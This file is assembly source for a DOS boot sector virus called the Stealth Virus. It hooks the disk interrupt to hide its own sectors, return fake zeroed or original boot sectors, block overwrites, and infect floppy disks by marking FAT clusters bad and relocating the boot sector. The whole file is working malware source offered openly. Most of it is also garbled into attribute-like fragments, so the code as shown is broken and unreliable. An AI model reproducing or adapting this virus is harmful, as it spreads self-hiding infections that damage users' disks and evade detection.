

;The Stealth Virus is a boot sector virus which remains resident in memory
;after boot so it can infect disks. It hides itself on the disk and includes
;special anti-detection interrupt traps so that it is very difficult to
;locate. This is a very infective and crafty virus.

COMSEG  SEGMENT PARA
        ASSUME  CS:COMSEG,DS:COMSEG,ES:COMSEG,SS:COMSEG

        ORG     100H

START:
        jmp     BOOT_START

;*******************************************************************************
;* BIOS DATA AREA                                                              *
;*******************************************************************************

        ORG     413H

MEMSIZE DW      640                     ;size of memory installed, in KB

;*******************************************************************************
;* VIRUS CODE STARTS HERE                                                      *
;*******************************************************************************

        ORG     7000H

STEALTH:                                ;A label for the beginning of the virus


;*******************************************************************************
;Format data consists of Track #, Head #, Sector # and Sector size code (2=512b)
;for every sector on the track. This is put at the very start of the virus so
;that when sectors are formatted, we will not run into a DMA boundary, which
;would cause the format to fail. This is a false error, but one that happens
;with some BIOS's, so we avoid it by putting this data first.
;FMT_12M:        ;Format data for Track 80, Head 1 on a 1.2 Meg diskette,
;        DB      80,1,1,2, 80,1,2,2, 80,1,3,2, 80,1,4,2, 80,1,5,2, 80,1,6,2
;
;FMT_360:        ;Format data for Track  40, Head 1 on a 360K diskette
;        DB      40,1,1,2, 40,1,2,2, 40,1,3,2, 40,1,4,2, 40,1,5,2, 40,1,6,2


;*******************************************************************************
;* INTERRUPT 13H HANDLER                                                       *
;*******************************************************************************

OLD_13H DD      ?                       ;Old interrupt 13H vector goes here

INT_13H:
        sti
        cmp     ah,2                    ;we want to intercept reads
        jz      READ_FUNCTION
        cmp     ah,3                    ;and writes to all disks
        jz      WRITE_FUNCTION
I13R:   jmp     DWORD PTR cs:[OLD_13H]


;*******************************************************************************
;This section of code handles all attempts to access the Disk BIOS Function 2,
;(Read). It checks for several key situations where it must jump into action.
;they are:
;       1) If an attempt is made to read the boot sector, it must be processed
;          through READ_BOOT, so an infected boot sector is never seen. Instead,
;          the original boot sector is read.
;       2) If any of the infected sectors, Track 0, Head 0, Sector 2-7 on
;          drive C are read, they are processed by READ_HARD, so the virus
;          code is never seen on the hard drive.
;       3) If an attempt is made to read the boot sector on the floppy, and
;          the motor is off, this routine checks to see if the floppy has
;          already been infected, and if not, it goes ahead and infects it.

READ_FUNCTION:                                  ;Disk Read Function Handler
        cmp     dh,0                            ;is it head 0?
        jnz     I13R                            ;nope, let BIOS handle it
        cmp     ch,0                            ;is it track 0?
        jnz     I13R                            ;no, let BIOS handle it
        cmp     cl,1                            ;track 0, is it sector 1
        jz      READ_BOOT                       ;yes, go handle boot sector read
        cmp     dl,80H                          ;no, is it hard drive c:?
        jnz     I13R                            ;no, let BIOS handle it
        cmp     cl,8                            ;sector < 8?="" jnc="" i13r="" ;nope,="" let="" bios="" handle="" it="" jmp="" read_hard="" ;yes,="" divert="" read="" on="" the="" c="" drive="" ;*******************************************************************************="" ;this="" section="" of="" code="" handles="" all="" attempts="" to="" access="" the="" disk="" bios="" function="" 3,="" ;(write).="" it="" checks="" for="" two="" key="" situations="" where="" it="" must="" jump="" into="" action.="" they="" ;are:="" ;="" 1)="" if="" an="" attempt="" is="" made="" to="" write="" the="" boot="" sector,="" it="" must="" be="" processed="" ;="" through="" write_boot,="" so="" an="" infected="" boot="" sector="" is="" never="" overwritten.="" ;="" instead,="" the="" write="" is="" redirected="" to="" where="" the="" original="" boot="" sector="" is="" ;="" hidden.="" ;="" 2)="" if="" any="" of="" the="" infected="" sectors,="" track="" 0,="" head="" 0,="" sector="" 2-7="" on="" ;="" drive="" c="" are="" written,="" they="" are="" processed="" by="" write_hard,="" so="" the="" virus="" ;="" code="" is="" never="" overwritten.="" write_function:="" ;bios="" disk="" write="" function="" cmp="" dh,0="" ;is="" it="" head="" 0?="" jnz="" i13r="" ;nope,="" let="" bios="" handle="" it="" cmp="" ch,0="" ;is="" it="" track="" 0?="" jnz="" i13r="" ;nope,="" let="" bios="" handle="" it="" cmp="" cl,1="" ;is="" it="" sector="" 1="" jnz="" wf1="" ;nope,="" check="" for="" hard="" drive="" jmp="" write_boot="" ;yes,="" go="" handle="" boot="" sector="" read="" wf1:="" cmp="" dl,80h="" ;is="" it="" the="" hard="" drive="" c:="" jnz="" i13r="" ;no,="" another="" hard="" drive="" cmp="" cl,8="" ;sector="">< 8?="" jnc="" i13r="" ;nope,="" let="" bios="" handle="" it="" jmp="" write_hard="" ;else="" take="" care="" of="" writing="" to="" c:="" ;*******************************************************************************="" ;this="" section="" of="" code="" handles="" reading="" the="" boot="" sector.="" there="" are="" three="" ;possibilities:="" 1)="" the="" disk="" is="" not="" infected,="" in="" which="" case="" the="" read="" should="" be="" ;passed="" directly="" to="" bios,="" 2)="" the="" disk="" is="" infected="" and="" only="" one="" sector="" is="" ;requested,="" in="" which="" case="" this="" routine="" figures="" out="" where="" the="" original="" boot="" ;sector="" is="" and="" reads="" it,="" and="" 3)="" the="" disk="" is="" infected="" and="" more="" than="" one="" sector="" ;is="" requested,="" in="" which="" case="" this="" routine="" breaks="" the="" read="" up="" into="" two="" calls="" to="" ;the="" rom="" bios,="" one="" to="" fetch="" the="" original="" boot="" sector,="" and="" another="" to="" fetch="" the="" ;additional="" sectors="" being="" read.="" one="" of="" the="" complexities="" in="" this="" last="" case="" is="" ;that="" the="" routine="" must="" return="" the="" registers="" set="" up="" as="" if="" only="" one="" read="" had="" ;been="" performed.="" ;="" to="" determine="" if="" the="" disk="" is="" infected,="" the="" routine="" reads="" the="" real="" boot="" sector="" ;into="" scratchbuf="" and="" calls="" is_vbs.="" if="" that="" returns="" affirmative="" (z="" set),="" then="" ;this="" routine="" goes="" to="" get="" the="" original="" boot="" sector,="" etc.,="" otherwise="" it="" calls="" rom="" ;bios="" and="" allows="" a="" second="" read="" to="" take="" place="" to="" get="" the="" boot="" sector="" into="" the="" ;requested="" buffer="" at="" es:bx.="" read_boot:="" cmp="" dl,80h="" ;check="" if="" we="" must="" infect="" first="" jnc="" rdboot="" ;don't="" need="" to="" infect="" hard="" dsk="" call="" check_disk="" ;is="" floppy="" already="" infected?="" jz="" rdboot="" ;yes,="" go="" do="" read="" call="" infect_floppy="" ;no,="" go="" infect="" the="" diskette="" rdboot:="" push="" ax="" ;now="" perform="" a="" redirected="" read="" push="" bx="" ;save="" registers="" push="" cx="" push="" dx="" push="" ds="" push="" es="" push="" bp="" push="" cs="" ;set="" ds="es=cs" pop="" es="" push="" cs="" pop="" ds="" mov="" bp,sp="" ;and="" bp="sp" rb001:="" mov="" al,dl="" call="" get_boot_sec="" ;read="" the="" real="" boot="" sector="" jnc="" rb01="" ;ok,="" go="" on="" call="" get_boot_sec="" ;do="" it="" again="" to="" make="" sure="" jnc="" rb01="" ;ok,="" go="" on="" jmp="" rb_goon="" ;error,="" let="" bios="" return="" err="" code="" rb01:="" call="" is_vbs="" ;is="" it="" the="" viral="" boot="" sector?="" jz="" rb02="" ;yes,="" jump="" jmp="" rb_goon="" ;no,="" let="" rom="" bios="" read="" sector="" rb02:;="" mov="" bx,offset="" scratchbuf="" +="" (offset="" dr_flag="" -="" offset="" boot_start)="" mov="" bx,offset="" sb_dr_flag="" ;required="" instead="" of="" ^="" for="" a86="" mov="" al,byte="" ptr="" [bx]="" ;get="" disk="" type="" of="" disk="" being="" cmp="" al,80h="" ;read,="" and="" make="" an="" index="" of="" it="" jnz="" rb1="" mov="" al,4="" rb1:="" mov="" bl,3="" ;to="" look="" up="" location="" of="" boot="" sec="" mul="" bl="" add="" ax,offset="" boot_sector_location="" ;ax="@BOOT_SECTOR_LOCATION" table="" mov="" bx,ax="" mov="" ch,[bx]="" ;get="" track="" of="" orig="" boot="" sector="" mov="" dh,[bx+1]="" ;get="" head="" of="" orig="" boot="" sector="" mov="" cl,[bx+2]="" ;get="" sector="" of="" orig="" boot="" sector="" mov="" dl,ss:[bp+6]="" ;get="" drive="" from="" original="" spec="" mov="" bx,ss:[bp+10]="" ;get="" read="" buffer="" offset="" mov="" ax,ss:[bp+2]="" ;and="" segment="" mov="" es,ax="" ;from="" original="" specification="" mov="" ax,201h="" ;prepare="" to="" read="" 1="" sector="" pushf="" call="" dword="" ptr="" [old_13h]="" ;do="" bios="" int="" 13h="" mov="" al,ss:[bp+12]="" ;see="" if="" original="" request="" cmp="" al,1="" ;was="" for="" more="" than="" one="" sector="" jz="" rb_exit="" ;no,="" go="" exit="" read_1next:="" ;more="" than="" 1="" sec="" requested,="" so="" pop="" bp="" ;read="" the="" rest="" as="" a="" second="" call="" pop="" es="" ;to="" bios="" pop="" ds="" pop="" dx="" ;first="" restore="" these="" registers="" pop="" cx="" pop="" bx="" pop="" ax="" add="" bx,512="" ;prepare="" to="" call="" bios="" for="" push="" ax="" ;balance="" of="" read="" dec="" al="" ;get="" registers="" straight="" for="" it="" inc="" cl="" cmp="" dl,80h="" ;is="" it="" the="" hard="" drive?="" jnz="" rb15="" ;nope,="" go="" handle="" floppy="" push="" bx="" ;handle="" an="" infected="" hard="" drive="" push="" cx="" ;by="" faking="" read="" on="" extra="" sectors="" push="" dx="" ;and="" returning="" a="" block="" of="" 0's="" push="" si="" push="" di="" push="" ds="" push="" bp="" push="" es="" pop="" ds="" ;ds="es" mov="" byte="" ptr="" [bx],0="" ;set="" first="" byte="" in="" buffer="0" mov="" si,bx="" mov="" di,bx="" inc="" di="" mov="" ah,0="" ;ax="number" of="" sectors="" to="" read="" mov="" bx,512="" ;bytes="" per="" sector="" mul="" bx="" ;#="" of="" bytes="" to="" read="" in=""><64k mov="" cx,ax="" dec="" cx="" ;number="" of="" bytes="" to="" move="" in="" cx="" rep="" movsb="" ;fill="" buffer="" with="" 0's="" clc="" ;clear="" c,="" fake="" read="" successful="" pushf="" ;then="" restore="" everyting="" properly="" pop="" ax="" ;first="" set="" flag="" register="" mov="" ss:[bp+20],ax="" ;as="" stored="" on="" the="" stack="" pop="" bp="" ;and="" pop="" all="" registers="" pop="" ds="" pop="" di="" pop="" si="" pop="" dx="" pop="" cx="" pop="" bx="" pop="" ax="" mov="" ah,0="" dec="" cl="" sub="" bx,512="" iret="" ;and="" get="" out="" rb15:="" ;read="" next="" sectors="" on="" floppy="" pushf="" ;call="" bios="" to="" call="" dword="" ptr="" cs:[old_13h]="" ;read="" the="" rest="" (must="" use="" cs)="" push="" ax="" push="" bp="" mov="" bp,sp="" pushf="" ;use="" c="" flag="" from="" bios="" call="" pop="" ax="" ;to="" set="" c="" flag="" on="" the="" stack="" mov="" ss:[bp+10],ax="" jc="" rb2="" ;if="" error,="" return="" ah="" from="" 2nd="" rd="" sub="" bx,512="" ;else="" restore="" registers="" so="" dec="" cl="" ;it="" looks="" as="" if="" only="" one="" read="" pop="" bp="" ;was="" performed="" pop="" ax="" pop="" ax="" ;and="" exit="" with="" ah="0" to="" indicate="" mov="" ah,0="" ;successful="" read="" iret="" rb2:="" pop="" bp="" ;error="" on="" 2nd="" read="" pop="" ax="" ;so="" clean="" up="" stack="" add="" sp,2="" ;and="" get="" out="" iret="" rb_exit:="" ;exit="" from="" single="" sector="" read="" mov="" ax,ss:[bp+18]="" ;set="" the="" c="" flag="" on="" the="" stack="" push="" ax="" ;to="" indicate="" successful="" read="" popf="" clc="" pushf="" pop="" ax="" mov="" ss:[bp+18],ax="" pop="" bp="" ;restore="" all="" registers="" pop="" es="" pop="" ds="" pop="" dx="" pop="" cx="" pop="" bx="" pop="" ax="" mov="" ah,0="" iret="" ;and="" get="" out="" rb_goon:="" ;this="" passes="" control="" to="" bios="" pop="" bp="" ;for="" uninfected="" disks="" pop="" es="" ;just="" restore="" all="" registers="" to="" pop="" ds="" ;their="" original="" values="" pop="" dx="" pop="" cx="" pop="" bx="" pop="" ax="" jmp="" i13r="" ;and="" go="" jump="" to="" bios="" ;*******************************************************************************="" ;this="" table="" identifies="" where="" the="" original="" boot="" sector="" is="" located="" for="" each="" ;of="" the="" various="" disk="" types.="" it="" is="" used="" by="" read_boot="" and="" write_boot="" to="" redirect="" ;boot="" sector="" reads="" and="" writes.="" boot_sector_location:="" db="" 39,1,9="" ;track,="" head,="" sector,="" 360k="" drive="" db="" 79,1,15="" ;1.2m="" drive="" db="" 79,1,9="" ;720k="" drive="" db="" 79,1,18="" ;1.44m="" drive="" db="" 0,0,7="" ;hard="" drive="" ;*******************************************************************************="" ;this="" routine="" handles="" writing="" the="" boot="" sector="" for="" all="" disks.="" it="" checks="" to="" see="" ;if="" the="" disk="" has="" been="" infected,="" and="" if="" not,="" allows="" bios="" to="" handle="" the="" write.="" ;if="" the="" disk="" is="" infected,="" this="" routine="" redirects="" the="" write="" to="" put="" the="" boot="" ;sector="" being="" written="" in="" the="" reserved="" area="" for="" the="" original="" boot="" sector.="" it="" ;must="" also="" handle="" the="" writing="" of="" multiple="" sectors="" properly,="" just="" as="" read_boot="" ;did.="" write_boot:="" push="" ax="" ;save="" everything="" we="" might="" change="" push="" bx="" push="" cx="" push="" dx="" push="" ds="" push="" es="" push="" bp="" mov="" bp,sp="" push="" cs="" ;ds="es=cs" pop="" ds="" push="" cs="" pop="" es="" mov="" al,dl="" call="" get_boot_sec="" ;read="" the="" real="" boot="" sector="" jnc="" wb01="" call="" get_boot_sec="" ;do="" it="" again="" if="" first="" failed="" jnc="" wb01="" jmp="" wb_goon="" ;error="" on="" read,="" let="" bios="" take="" it="" wb01:="" call="" is_vbs="" ;else,="" is="" disk="" infected?="" jz="" wb02="" ;yes="" jmp="" wb_goon="" ;no,="" let="" rom="" bios="" write="" sector="" wb02:;="" mov="" bx,offset="" scratchbuf="" +="" (offset="" dr_flag="" -="" offset="" boot_start)="" mov="" bx,offset="" sb_dr_flag="" ;required="" instead="" of="" ^="" for="" a86="" mov="" al,byte="" ptr="" [bx]="" cmp="" al,80h="" ;infected,="" so="" redirect="" the="" write="" jnz="" wb1="" mov="" al,4="" ;make="" an="" index="" of="" the="" drive="" type="" wb1:="" mov="" bl,3="" mul="" bl="" add="" ax,offset="" boot_sector_location="" ;ax="@table" entry="" mov="" bx,ax="" mov="" ch,[bx]="" ;get="" the="" location="" of="" original="" mov="" dh,[bx+1]="" ;boot="" sector="" on="" disk="" mov="" cl,[bx+2]="" ;prepare="" for="" the="" write="" mov="" dl,ss:[bp+6]="" mov="" bx,ss:[bp+10]="" mov="" ax,ss:[bp+2]="" mov="" es,ax="" mov="" ax,301h="" pushf="" call="" dword="" ptr="" [old_13h]="" ;and="" do="" it="" sti="" mov="" dl,ss:[bp+6]="" cmp="" dl,80h="" ;was="" write="" going="" to="" hard="" drive?="" jnz="" wb_15="" ;no="" mov="" byte="" ptr="" [dr_flag],80h="" ;yes,="" update="" partition="" info="" push="" si="" push="" di="" mov="" di,offset="" part="" ;just="" move="" it="" from="" sec="" we="" just="" mov="" si,ss:[bp+10]="" ;wrote="" into="" the="" viral="" boot="" sec="" add="" si,offset="" part="" sub="" si,offset="" boot_start="" push="" es="" pop="" ds="" push="" cs="" pop="" es="" ;switch="" ds="" and="" es="" around="" mov="" cx,20="" rep="" movsw="" ;and="" do="" the="" move="" push="" cs="" pop="" ds="" mov="" ax,301h="" mov="" bx,offset="" boot_start="" mov="" cx,1="" ;track="" 0,="" sector="" 1="" mov="" dx,80h="" ;drive="" 80h,="" head="" 0="" pushf="" ;go="" write="" updated="" viral="" boot="" sec="" call="" dword="" ptr="" [old_13h]="" ;with="" new="" partition="" info="" pop="" di="" ;clean="" up="" pop="" si="" wb_15:="" mov="" al,ss:[bp+12]="" cmp="" al,1="" ;was="" write="" more="" than="" 1="" sector?="" jz="" wb_exit="" ;if="" not,="" then="" exit="" write_1next:="" ;more="" than="" 1="" sector="" mov="" dl,ss:[bp+6]="" ;see="" if="" it's="" the="" hard="" drive="" cmp="" dl,80h="" jz="" wb_exit="" ;if="" so,="" ignore="" rest="" of="" the="" write="" pop="" bp="" ;floppy="" drive,="" go="" write="" the="" rest="" pop="" es="" ;as="" a="" second="" call="" to="" bios="" pop="" ds="" pop="" dx="" pop="" cx="" ;restore="" all="" registers="" pop="" bx="" pop="" ax="" add="" bx,512="" ;and="" modify="" a="" few="" to="" push="" ax="" ;drop="" writing="" the="" first="" sector="" dec="" al="" inc="" cl="" pushf="" call="" dword="" ptr="" cs:[old_13h]="" ;go="" write="" the="" rest="" sti="" push="" ax="" push="" bp="" mov="" bp,sp="" pushf="" ;use="" c="" flag="" from="" call="" pop="" ax="" ;to="" set="" c="" flag="" on="" the="" stack="" mov="" ss:[bp+10],ax="" jc="" wb2="" ;an="" error="" ;so="" exit="" with="" ah="" from="" 2nd="" int="" 13="" sub="" bx,512="" dec="" cl="" pop="" bp="" pop="" ax="" pop="" ax="" ;else="" exit="" with="" ah="0" mov="" ah,0="" ;to="" indicate="" success="" iret="" wb2:="" pop="" bp="" ;exit="" with="" ah="" from="" 2nd="" pop="" ax="" ;interrupt="" add="" sp,2="" iret="" wb_exit:="" ;exit="" after="" 1st="" write="" mov="" ax,ss:[bp+18]="" ;set="" carry="" on="" stack="" to="" indicate="" push="" ax="" ;a="" successful="" write="" operation="" popf="" clc="" pushf="" pop="" ax="" mov="" ss:[bp+18],ax="" pop="" bp="" ;restore="" all="" registers="" and="" exit="" pop="" es="" pop="" ds="" pop="" dx="" pop="" cx="" pop="" bx="" pop="" ax="" mov="" ah,0="" iret="" wb_goon:="" ;pass="" control="" to="" rom="" bios="" pop="" bp="" ;just="" restore="" all="" registers="" pop="" es="" pop="" ds="" pop="" dx="" pop="" cx="" pop="" bx="" pop="" ax="" jmp="" i13r="" ;and="" go="" do="" it="" ;*******************************************************************************="" ;read="" hard="" disk="" sectors="" on="" track="" 0,="" head="" 0,="" sec=""> 1. If the disk is infected,
;then instead of reading the true data there, return a block of 0's, since
;0 is the data stored in a freshly formatted but unused sector. This will
;fake the caller out and keep him from knowing that the virus is hiding there.
;If the disk is not infected, return the true data stored in those sectors.

READ_HARD:
        call    CHECK_DISK                      ;see if disk is infected
        jnz     RWH_EX                          ;no, let BIOS handle the read
        push    ax                              ;else save registers
        push    bx
        push    cx
        push    dx
        push    si
        push    di
        push    ds
        push    bp
        mov     bp,sp
        mov     BYTE PTR es:[bx],0              ;zero the first byte in the blk
        push    es
        pop     ds
        mov     si,bx                           ;set up es:di and ds:si
        mov     di,bx                           ;for a transfer
        inc     di
        mov     ah,0                            ;ax=number of sectors to read
        mov     bx,512                          ;bytes per sector
        mul     bx                              ;number of bytes to read in ax
        mov     cx,ax
        dec     cx                              ;number of bytes to move
        rep     movsb                           ;do fake read of all 0's

        mov     ax,ss:[bp+20]                   ;now set c flag
        push    ax                              ;to indicate succesful read
        popf
        clc
        pushf
        pop     ax
        mov     ss:[bp+20],ax

        pop     bp                              ;restore everything and exit
        pop     ds
        pop     di
        pop     si
        pop     dx
        pop     cx
        pop     bx
        pop     ax
        mov     ah,0                            ;set to indicate successful read
        iret

RWH_EX: jmp     I13R                            ;pass control to BIOS


;*******************************************************************************
;Handle writes to hard disk Track 0, Head 0, 1<><8. we="" must="" stop="" the="" write="" if="" ;the="" disk="" is="" infected.="" instead,="" fake="" the="" return="" of="" an="" error="" by="" setting="" carry="" ;and="" returning="" ah="4" (sector="" not="" found).="" write_hard:="" call="" check_disk="" ;see="" if="" the="" disk="" is="" infected="" jnz="" rwh_ex="" ;no,="" let="" bios="" handle="" it="" all="" push="" bp="" ;yes,="" infected,="" so="" .="" .="" .="" push="" ax="" mov="" bp,sp="" mov="" ax,ss:[bp+8]="" ;get="" flags="" off="" of="" stack="" push="" ax="" popf="" ;put="" them="" in="" current="" flags="" stc="" ;set="" the="" carry="" flag="" pushf="" pop="" ax="" mov="" ss:[bp+8],ax="" ;and="" put="" flags="" back="" on="" stack="" pop="" ax="" mov="" ah,4="" ;set="" up="" sector="" not="" found="" error="" pop="" bp="" iret="" ;and="" get="" out="" of="" isr="" ;*******************************************************************************="" ;see="" if="" disk="" dl="" is="" infected="" already.="" if="" so,="" return="" with="" z="" set.="" this="" ;does="" not="" assume="" that="" registers="" have="" been="" saved,="" and="" saves/restores="" everything="" ;but="" the="" flags.="" check_disk:="" push="" ax="" ;save="" everything="" push="" bx="" push="" cx="" push="" dx="" push="" ds="" push="" es="" push="" cs="" pop="" ds="" push="" cs="" pop="" es="" mov="" al,dl="" call="" get_boot_sec="" ;read="" the="" boot="" sector="" jnc="" cd1="" xor="" al,al="" ;act="" as="" if="" infected="" jmp="" short="" cd2="" ;in="" the="" event="" of="" an="" error="" cd1:="" call="" is_vbs="" ;see="" if="" viral="" boot="" sec="" (set="" z)="" cd2:="" pop="" es="" ;restore="" everything="" pop="" ds="" ;except="" the="" z="" flag="" pop="" dx="" pop="" cx="" pop="" bx="" pop="" ax="" ret="" ;*******************************************************************************="" ;this="" routine="" determines="" from="" the="" boot="" sector="" parameters="" what="" kind="" of="" floppy="" ;disk="" is="" in="" the="" drive="" being="" accessed,="" and="" calls="" the="" proper="" infection="" routine="" ;to="" infect="" the="" drive.="" it="" has="" no="" safeguards="" to="" prevent="" infecting="" an="" already="" ;infected="" disk.="" the="" routine="" check_disk="" must="" be="" called="" first="" to="" make="" sure="" you="" ;want="" to="" infect="" before="" you="" go="" and="" do="" it.="" this="" restores="" all="" registers="" to="" their="" ;initial="" state.="" infect_floppy:="" pushf="" ;save="" everything="" push="" si="" push="" di="" push="" ax="" push="" bx="" push="" cx="" push="" dx="" push="" ds="" push="" es="" push="" cs="" pop="" es="" push="" cs="" pop="" ds="" sti="" mov="" bx,offset="" scratchbuf="" +="" 13h="" ;@="" of="" sec="" cnt="" in="" boot="" sector="" mov="" bx,[bx]="" ;get="" sector="" count="" for="" this="" disk="" mov="" al,dl="" cmp="" bx,720="" ;is="" it="" 360k?="" (720="" sectors)="" jnz="" if_1="" ;no,="" try="" another="" possibility="" call="" infect_360k="" ;yes,="" infect="" it="" jmp="" short="" if_r="" ;and="" get="" out="" if_1:="" cmp="" bx,2400="" ;is="" it="" 1.2m?="" (2400="" sectors)="" jnz="" if_2="" ;no,="" try="" another="" possibility="" call="" infect_12m="" ;yes,="" infect="" it="" jmp="" short="" if_r="" ;and="" get="" out="" if_2:="" cmp="" bx,1440="" ;is="" it="" 720k="" 3="" 1/2"?="" (1440="" secs)="" jnz="" if_3="" ;no,="" try="" another="" possibility="" call="" infect_720k="" ;yes,="" infect="" it="" jmp="" short="" if_r="" ;and="" get="" out="" if_3:="" cmp="" bx,2880="" ;is="" it="" 1.44m="" 3="" 1/2"?="" (2880="" secs)="" jnz="" if_r="" ;no="" -="" don't="" infect="" this="" disk="" call="" infect_144m="" ;yes="" -="" infect="" it="" if_r:="" pop="" es="" ;restore="" everyting="" and="" return="" pop="" ds="" pop="" dx="" pop="" cx="" pop="" bx="" pop="" ax="" pop="" di="" pop="" si="" popf="" ret="" ;*******************************************************************************="" ;infect="" a="" 360="" kilobyte="" drive.="" this="" is="" done="" by="" formatting="" track="" 40,="" head="" 0,="" ;sectors="" 1="" to="" 6,="" putting="" the="" present="" boot="" sector="" in="" sector="" 6="" with="" the="" virus="" ;code="" in="" sectors="" 1="" through="" 5,="" and="" then="" replacing="" the="" boot="" sector="" on="" the="" disk="" ;with="" the="" viral="" boot="" sector.="" infect_360k:="" mov="" dl,al="" ;read="" the="" fat="" from="" mov="" cx,3="" ;track="" 0,="" sector="" 3,="" head="" 0="" mov="" dh,0="" call="" read_disk="" mov="" bx,ax="" jc="" inf360_exit="" mov="" di,offset="" scratchbuf="" +="" 11h="" ;modify="" the="" fat="" in="" ram="" mov="" ax,[di]="" ;make="" sure="" nothing="" is="" stored="" and="" ax,0fff0h="" or="" ax,[di+2]="" ;if="" it="" is,="" abort="" infect...="" or="" ax,[di+4]="" ;don't="" wipe="" out="" any="" data="" jnz="" inf360_exit="" ;if="" so,="" abort="" infection="" mov="" ax,[di]="" or="" ax,0ff70h="" stosw="" mov="" ax,07ff7h="" ;marking="" the="" last="" 6="" clusters="" stosw="" ;as="" bad="" mov="" ax,00ffh="" stosw="" mov="" ax,bx="" ;write="" the="" fat="" back="" to="" disk="" mov="" cx,3="" ;at="" track="" 0,="" sector="" 3,="" head="" 0="" mov="" dl,bl="" mov="" dh,0="" call="" write_disk="" ;write="" the="" fat="" back="" to="" disk="" jc="" inf360_exit="" inf360_retry:="" mov="" dl,al="" ;write="" the="" 2nd="" fat="" too,="" mov="" cx,5="" ;at="" track="" 0,="" sector="" 5,="" head="" 0="" mov="" dh,0="" call="" write_disk="" jc="" inf360_retry="" ;must="" retry,="" since="" 1st="" fat="" done="" call="" get_boot_sec="" ;read="" the="" boot="" sector="" in="" jc="" inf360_exit="" mov="" dl,al="" ;write="" the="" orig="" boot="" sector="" at="" mov="" dh,1="" ;head="" 1="" mov="" cx,2709h="" ;track="" 39,="" sector="" 9="" call="" write_disk="" jc="" inf360_exit="" push="" ax="" mov="" di,offset="" boot_data="" ;="" mov="" si,offset="" scratchbuf="" +="" (offset="" boot_data="" -="" offset="" boot_start)="" mov="" si,offset="" sb_boot_data="" ;required="" instead="" of="" ^="" for="" a86="" mov="" cx,32h="" 2="" ;copy="" boot="" sector="" disk="" info="" over="" rep="" movsw="" ;to="" new="" boot="" sector="" mov="" byte="" ptr="" [dr_flag],0="" ;set="" proper="" diskette="" type="" pop="" ax="" call="" put_boot_sec="" ;go="" write="" it="" to="" disk="" jc="" inf360_exit="" mov="" bx,offset="" stealth="" ;buffer="" for="" 5="" sectors="" of="" stealth="" mov="" dl,al="" ;drive="" to="" write="" to="" mov="" dh,1="" ;head="" 1="" mov="" cx,2704h="" ;track="" 39,="" sector="" 4="" mov="" ax,0305h="" ;write="" 5="" sectors="" pushf="" call="" dword="" ptr="" [old_13h]="" ;(int="" 13h)="" inf360_exit:="" ret="" ;all="" done="" ;*******************************************************************************="" ;infect="" 1.2="" megabyte="" floppy="" disk="" drive="" al="" with="" this="" virus.="" this="" is="" essentially="" ;the="" same="" as="" the="" 360k="" case.="" infect_12m:="" mov="" dl,al="" ;read="" the="" fat="" from="" mov="" cx,8="" ;track="" 0,="" sector="" 8,="" head="" 0="" mov="" dh,0="" call="" read_disk="" mov="" bx,ax="" jc="" inf12m_exit="" mov="" di,offset="" scratchbuf="" +="" 1ddh="" ;modify="" the="" fat="" in="" ram="" mov="" ax,[di]="" ;make="" sure="" nothing="" is="" stored="" or="" ax,[di+2]="" ;if="" it="" is,="" abort="" infect...="" or="" ax,[di+4]="" ;don't="" wipe="" out="" any="" data="" or="" ax,[di+6]="" or="" ax,[di+8]="" jnz="" inf12m_exit="" ;if="" so,="" abort="" infection="" mov="" ax,07ff7h="" stosw="" mov="" ax,0f7ffh="" ;marking="" the="" last="" 6="" clusters="" stosw="" ;as="" bad="" mov="" ax,0ff7fh="" stosw="" mov="" ax,07ff7h="" stosw="" mov="" ax,000ffh="" stosw="" mov="" ax,bx="" ;write="" the="" fat="" back="" to="" disk="" mov="" cx,8="" ;at="" track="" 0,="" sector="" 8,="" head="" 0="" mov="" dl,bl="" mov="" dh,0="" call="" write_disk="" ;write="" the="" fat="" back="" to="" disk="" jc="" inf12m_exit="" inf12m_retry:="" mov="" dl,al="" ;write="" the="" 2nd="" fat="" too,="" mov="" cx,0fh="" ;at="" track="" 0,="" sector="" 15,="" head="" 0="" mov="" dh,0="" call="" write_disk="" jc="" inf12m_retry="" ;must="" retry,="" since="" 1st="" fat="" done="" call="" get_boot_sec="" ;read="" the="" boot="" sector="" in="" jc="" inf12m_exit="" mov="" dl,al="" ;write="" the="" orig="" boot="" sector="" at="" mov="" dh,1="" ;head="" 1="" mov="" cx,4f0fh="" ;track="" 79,="" sector="" 15="" call="" write_disk="" jc="" inf12m_exit="" push="" ax="" mov="" di,offset="" boot_data="" ;="" mov="" si,offset="" scratchbuf="" +="" (offset="" boot_data="" -="" offset="" boot_start)="" mov="" si,offset="" sb_boot_data="" ;required="" instead="" of="" ^="" for="" a86="" mov="" cx,32h="" 2="" ;copy="" boot="" sector="" disk="" info="" over="" rep="" movsw="" ;to="" new="" boot="" sector="" mov="" byte="" ptr="" [dr_flag],1="" ;set="" proper="" diskette="" type="" pop="" ax="" call="" put_boot_sec="" ;go="" write="" it="" to="" disk="" jc="" inf12m_exit="" mov="" bx,offset="" stealth="" ;buffer="" for="" 5="" sectors="" of="" stealth="" mov="" dl,al="" ;drive="" to="" write="" to="" mov="" dh,1="" ;head="" 1="" mov="" cx,4f0ah="" ;track="" 79,="" sector="" 10="" mov="" ax,0305h="" ;write="" 5="" sectors="" pushf="" call="" dword="" ptr="" [old_13h]="" ;(int="" 13h)="" inf12m_exit:="" ret="" ;all="" done="" ;*******************************************************************************="" ;infect="" a="" 3="" 1/2"="" 720k="" drive.="" this="" process="" is="" a="" little="" different="" than="" for="" 5="" 1/4"="" ;drives.="" the="" virus="" goes="" in="" an="" existing="" data="" area="" on="" the="" disk,="" so="" no="" formatting="" ;is="" required.="" instead,="" we="" 1)="" mark="" the="" diskette's="" fat="" to="" indicate="" that="" the="" last="" ;three="" clusters="" are="" bad,="" so="" that="" dos="" will="" not="" attempt="" to="" overwrite="" the="" virus="" ;code.="" 2)="" read="" the="" boot="" sector="" and="" put="" it="" at="" track="" 79,="" head="" 1="" sector="" 9,="" 3)="" put="" ;the="" five="" sectors="" of="" stealth="" routines="" at="" track="" 79,="" head="" 1,="" sector="" 4-8,="" 4)="" put="" ;the="" viral="" boot="" sector="" at="" track="" 0,="" head="" 0,="" sector="" 1.="" infect_720k:="" mov="" dl,al="" ;read="" the="" fat="" from="" mov="" cx,4="" ;track="" 0,="" sector="" 4,="" head="" 0="" mov="" dh,0="" call="" read_disk="" mov="" bx,ax="" jc="" inf720_exit="" mov="" di,offset="" scratchbuf="" +="" 44="" ;modify="" the="" fat="" in="" ram="" mov="" ax,[di]="" ;make="" sure="" nothing="" is="" stored="" or="" ax,[di+2]="" ;if="" it="" is,="" abort="" infect...="" or="" 